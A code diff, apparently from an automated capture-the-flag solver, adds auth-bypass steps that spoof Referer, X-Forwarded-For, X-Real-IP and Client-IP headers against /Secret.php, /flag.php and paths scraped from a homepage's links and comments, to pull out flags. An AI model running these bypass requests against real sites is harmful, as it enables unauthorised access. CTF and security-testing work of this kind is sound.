@@ -85,7 +85,14 @@ class AuthLogicMachine(RouteStateMachine):
                              f"No auth indicators (status {status})")
 
     def get_exploit_steps(self) -> List[Dict[str, Any]]:
-        """Auth bypass exploit steps."""
+        """Auth bypass exploit steps.
+
+        Includes both hardcoded common paths and dynamically discovered
+        paths from the homepage.
+        """
+        # Discover additional paths from homepage links
+        discovered_paths = self._discover_secret_paths()
+
         steps = [
             # Cookie manipulation
             {
@@ -179,8 +186,102 @@ class AuthLogicMachine(RouteStateMachine):
                 },
                 "extract_flag": True,
             },
+            # --- Header spoofing on Secret.php (common CTF pattern) ---
+            {
+                "name": "secret_php_referer_sycsecret_xff",
+                "description": "Secret.php with Referer Sycsecret + XFF",
+                "method": "GET",
+                "path": "/Secret.php",
+                "headers": {
+                    "Referer": "https://www.Sycsecret.com",
+                    "X-Forwarded-For": "127.0.0.1",
+                },
+                "extract_flag": True,
+            },
+            {
+                "name": "secret_php_referer_xff_xrealip",
+                "description": "Secret.php with all header spoofing",
+                "method": "GET",
+                "path": "/Secret.php",
+                "headers": {
+                    "Referer": "https://www.Sycsecret.com",
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Real-IP": "127.0.0.1",
+                    "Client-IP": "127.0.0.1",
+                },
+                "extract_flag": True,
+            },
+            # Common secret/flag paths with header combos
+            {
+                "name": "flag_php_headers",
+                "description": "/flag.php with all headers",
+                "method": "GET",
+                "path": "/flag.php",
+                "headers": {
+                    "Referer": "https://www.Sycsecret.com",
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Real-IP": "127.0.0.1",
+                    "Client-IP": "127.0.0.1",
+                },
+                "extract_flag": True,
+            },
+            {
+                "name": "index_php_xff",
+                "description": "/ with XFF + X-Real-IP + Client-IP",
+                "method": "GET",
+                "path": "/",
+                "headers": {
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Real-IP": "127.0.0.1",
+                    "Client-IP": "127.0.0.1",
+                    "Referer": "https://www.Sycsecret.com",
+                },
+                "extract_flag": True,
+            },
         ]
+
+        # Add dynamically discovered paths with header combinations
+        for i, path in enumerate(discovered_paths):
+            steps.append({
+                "name": f"discovered_{i}_all_headers",
+                "description": f"Discovered path {path} with all headers",
+                "method": "GET",
+                "path": path,
+                "headers": {
+                    "Referer": "https://www.Sycsecret.com",
+                    "X-Forwarded-For": "127.0.0.1",
+                    "X-Real-IP": "127.0.0.1",
+                    "Client-IP": "127.0.0.1",
+                },
+                "extract_flag": True,
+            })
+
         return steps
+
+    def _discover_secret_paths(self) -> List[str]:
+        """Discover secret/hidden paths from the homepage."""
+        import re
+        paths = []
+        try:
+            resp = self.session.get(self.target_url, timeout=8, allow_redirects=True)
+            if resp.status_code == 200 and resp.text:
+                # Extract links from href attributes
+                link_pattern = re.compile(r'href=["\']([^"\']+)["\']', re.IGNORECASE)
+                for match in link_pattern.finditer(resp.text):
+                    link = match.group(1)
+                    # Only internal links
+                    if link.startswith("/") and link not in ("/", "/admin", "/flag"):
+                        if link not in paths:
+                            paths.append(link)
+                # Extract from HTML comments (common CTF hint pattern)
+                comment_pattern = re.compile(r'<!--\s*([^\s]+\.php)\s*-->', re.IGNORECASE)
+                for match in comment_pattern.finditer(resp.text):
+                    path = "/" + match.group(1).lstrip("/")
+                    if path not in paths:
+                        paths.append(path)
+        except Exception:
+            pass
+        return paths[:5]  # Limit to 5 discovered paths
 
 
 # Register in MACHINE_REGISTRY
